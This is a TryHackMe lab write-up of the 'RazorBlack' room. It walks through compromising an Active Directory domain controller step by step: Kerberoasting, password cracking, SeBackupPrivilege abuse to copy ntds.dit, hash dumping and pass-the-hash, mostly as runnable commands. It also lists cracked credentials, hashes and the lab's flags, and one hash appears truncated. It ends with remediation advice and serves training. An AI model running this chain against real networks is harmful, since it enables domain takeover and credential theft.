# RazorBlack – TryHackMe Write-up

## 📌 Room Overview
* **Platform:** TryHackMe
* **Room Name:** RazorBlack
* **Target IP:** `10.49.138.183` / `10.49.172.143`
* **Domain:** `raz0rblack.thm`
* **Domain Controller:** `HAVEN-DC.raz0rblack.thm`
* **OS:** Windows Server 2019 (Active Directory Domain Controller)

---

## 🎯 Executive Summary
The target host is an Active Directory Domain Controller (`HAVEN-DC.raz0rblack.thm`).

1. **Reconnaissance & Kerberoasting:** Extracted Kerberos TGS tickets for Service Principal Name (SPN) accounts using Impacket's `GetUserSPNs.py` under the context of `lvetrova`. Cracked the resulting TGS hash offline with John the Ripper to obtain valid cleartext credentials for `xyan1d3`.
2. **Initial Shell & Credential Decryption:** Authenticated as `xyan1d3` via `evil-winrm`. Located `xyan1d3.xml` and decrypted the saved PowerShell CLIXML object to retrieve the user flag.
3. **SeBackupPrivilege Exploitation:** Verified group membership in `BUILTIN\Backup Operators` (`SeBackupPrivilege` enabled). Created a Volume Shadow Copy of `C:` using `diskshadow.exe` to expose shadow volume `W:`. Uploaded custom privilege DLLs (`SeBackupPrivilegeCmdLets.dll` & `SeBackupPrivilegeUtils.dll`) to bypass file locks and extract `ntds.dit` alongside the `HKLM\SYSTEM` hive via `reg save`.
4. **Offline Hash Extraction & Pass-the-Hash:** Used `secretsdump.py` on Kali to extract domain NTLM hashes from the offline `ntds.dit` database. Leveraged Administrator's NTLM hash (`9689931bed40ca5a2ce1218210177f0c`) to gain remote administrative access via `evil-winrm`.
5. **Root Flag & Supplemental Artifact Recovery:** Decoded Administrator's `root.xml` using CyberChef hex decoding to recover the Root Flag. Located supplemental flag files across user directories (`twilliams`) and retrieved `top_secret.png` from `C:\Program Files\Top Secret`.

---

## 🛠 Tools Used
* **Active Directory Exploitation:** Impacket (`GetUserSPNs.py`, `secretsdump.py`)
* **Password Cracking:** `John the Ripper`, `Hashcat`
* **Remote Administration / Shells:** `evil-winrm`
* **Privilege Escalation & Post-Exploitation:** `diskshadow.exe`, `SeBackupPrivilegeCmdLets.dll`, `SeBackupPrivilegeUtils.dll`, PowerShell (`Import-Clixml`), `reg`, CyberChef

---

## 🔍 Phase 1: Kerberoasting (`GetUserSPNs.py`) & Cracking

### 1. Requesting Service Principal Name (SPN) Tickets
Executed `GetUserSPNs.py` targeting the Domain Controller (`10.49.138.183`) using domain account `lvetrova` to request Kerberos TGS tickets:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.49.138.183 raz0rblack.thm/lvetrova -hashes :f220d398deb3f516c73f40ee16c431d -request > ~/Razorblack/xyan-hash-v2.txt
```
2. Password Cracking
Loaded the Kerberos 5 TGS ticket (```etype 23 / RC4-HMAC```) into John the Ripper using rockyou.txt:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt xyan-hash-v2.txt
```
- Cracked Credentials: xyan1d3 : ```cyanide9amine5628```

## 🚀 Phase 2: Shell Access & Saved Credential Recovery
1. Establishing WinRM Session
Connected to the target via ```evil-winrm```:
```bash
evil-winrm -i 10.49.138.183 -u xyan1d3 -p cyanide9amine5628
```
2. File Enumeration & CLIXML Credential Decryption
Navigated to ```C:\Users\xyan1d3```, identified ```xyan1d3.xml```, and decrypted the stored PowerShell credential object:
```powershell
cd C:\Users\xyan1d3
dir
$Credential = Import-Clixml -Path "xyan1d3.xml"
$Credential.GetNetworkCredential().password
```
- User Credential Flag: ```THM{62ca7e0b901aa8f0b233cade0839b5bb}```

## ⚡ Phase 3: Privilege Enumeration & SeBackupPrivilege Exploitation
Executing ```whoami /all``` confirmed membership in ```BUILTIN\Backup``` Operators with ```SeBackupPrivilege``` and ```SeRestorePrivilege``` enabled:
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> whoami /all
```
1. DiskShadow Script Preparation & Execution
Created a script ```diskshadow.txt``` to generate and expose a persistent Volume Shadow Copy of ```C:``` on drive letter ```W:```:
```plaintext
set context persistent nowriters
set metadata c:\tmp\example.cabs
set verbose on
begin backup
add volume c: alias mydrive
create
expose %mydrive% w:
end backup
```
Uploaded and executed the script on the target:
```powershell
mkdir c:\tmp
cd c:\tmp
upload diskshadow.txt
diskshadow.exe /s c:\tmp\diskshadow.txt
```
- Exposed Shadow Volume: ```W:``` pointing to ```\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1```

2. Copying System Locked Files
Uploaded custom privilege DLLs (```SeBackupPrivilegeCmdLets.dll & SeBackupPrivilegeUtils.dll```), imported the modules, and copied ```ntds.dit``` alongside saving the ```HKLM\SYSTEM``` hive:
```powershell
upload /home/kali/Razorblack/SeBackupPrivilegeCmdLets.dll C:\tmp\SeBackupPrivilegeCmdLets.dll
upload /home/kali/Razorblack/SeBackupPrivilegeUtils.dll C:\tmp\SeBackupPrivilegeUtils.dll

import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll

# Copy NTDS database from shadow copy W:
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\tmp\ntds.dit -overwrite

# Save SYSTEM registry hive
reg save HKLM\SYSTEM c:\tmp\system
```
3. Exfiltrating Dumped Artifacts
Downloaded ```ntds.dit``` and ```system``` to the Kali attack platform:
```powershell
download ntds.dit
download system
```
## 🔓 Phase 4: Domain Hash Dumping & Pass-the-Hash Access
1. Extracting NTLM Hashes (```secretsdump.py```)
Executed Impacket's ```secretsdump.py``` offline against the downloaded ```ntds.dit``` using the dumped system hive:
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system LOCAL -outputfile hashes
```
Recovered NTLM Hashes:
- Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
- Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
- HAVEN-DCS:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
- krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
- raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d398deb3f516c73f40ee16c431d:::
- raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
- raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::

2. Administrator Authentication via Pass-the-Hash
Logged into ```10.49.172.143``` using the Administrator NTLM hash:
```bash
evil-winrm -i 10.49.172.143 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
```
## 🚩 Phase 5: Root Flag & Post-Exploitation Artifacts
1. Root Flag Extraction (```root.xml```)
Inspected ```C:\Users\Administrator\root.xml```:
```powershell
cd C:\Users\Administrator
type root.xml
```
Extracted the hex payload inside the <SS> XML node and decoded it in CyberChef using the From Hex operation:
- Root Flag: ```THM{1b4f46cc4fba46348273d18dc91da20d}```

2. Additional User & System Artifacts
- User ```twilliams``` Flag:
```powershell
cd C:\Users\twilliams
type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
```
- Flag Value: ```THM{5144f2c4107b7cab04916724e3749fb0}```
- ```Top Secret``` Image Artifact:
```powershell
cd "C:\Program Files\Top Secret"
dir
download top_secret.png
```
Extracted File: ```top_secret.png``` (Meme image explaining how to exit Vim: ```:w```)

## 🏁 Summary of Recovered Flags & Artifacts

| Location / File Path                               | Description                | Recovered Value                       |
|:--                                                 |:--                         |:--                                    | 
| C:\Users\xyan1d3\xyan1d3.xml                       | Credential Flag            | THM{62ca7e0b901aa8f0b233cade0839b5bb} |
| C:\Users\Administrator\root.xml                    | Decoded Root Flag          | THM{1b4f46cc4fba46348273d18dc91da20d} |
| C:\Users\twilliams\definitely_..._not_a_flag.exe   | Supplemental User Flag     | THM{5144f2c4107b7cab04916724e3749fb0} |
| C:\Program Files\Top Secret\top_secret.png         | System Secret Artifact     | Vim Exit Meme (:w)                    |

## 💡 Key Remediation Recommendations
1. Hardening Service Accounts: Enforce long, high-entropy passwords (25+ characters) for all accounts with Service Principal Names (SPNs) or migrate to Group Managed Service Accounts (gMSAs) to restrict Kerberoasting viability.
2. Backup Operator Restraints: Strictly limit membership in BUILTIN\Backup Operators and review privileges associated with SeBackupPrivilege / SeRestorePrivilege, as these bypass standard Windows access control list (ACL) checks.
3. Volume Shadow Copy (VSS) Auditing: Implement event monitoring for VSS operations (such as Event ID 7036 and VSS shadow copy creation/exposition events) to detect unauthorized ntds.dit extraction attempts.
